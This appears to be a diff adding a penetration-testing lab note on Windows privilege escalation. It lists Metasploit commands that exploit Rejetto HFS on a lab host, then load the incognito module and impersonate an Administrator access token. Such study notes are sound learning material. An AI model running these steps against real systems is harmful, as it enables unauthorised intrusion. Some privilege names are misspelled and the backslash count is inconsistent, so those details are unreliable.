@@ -1,0 +1,49 @@
+### Access Token Exploitation (Priv Escalation)
+
+---
+
+##### First access with low privilege
+
+Exploiting HFS rejetto vulnerable version > 2.3
+
+> - msfconsole -q
+> - use exploit/windows/http/rejetto_hfs_exec
+> - set RHOSTS 10.0.27.103
+> - exploit
+
+##### **Checking the current user Informations**
+
+> - getuid
+> - sysinfo
+
+---
+
+##### Privileges required for Access token impersonation
+
+> - SeAssignPrimarryToken
+> - SeCreateToken
+> - SelmpersonatePrivilege
+
+**Note** : use getprivs
+
+---
+
+##### Load incognito module & list access token
+
+**Command**: load incognito
+
+> - list_tokens -u  // list available token
+
+---
+
+##### Impersonate access token
+
+**Command**: 
+
+> - impersonate_token ATTACKDEFENSE\\\Administrator
+
+We see here that there is a valid Administrator token that looks to be of interest. We now need to impersonate this token in order to assume its privileges. 
+
+When issuing the **impersonate_token** command, note the two backslashes in “ATTACKDEFENSE\\Administrator”.
+
+This is required as it causes bugs with just one slash. Note also that after successfully impersonating a token, we check our current userID by executing the **getuid** command.
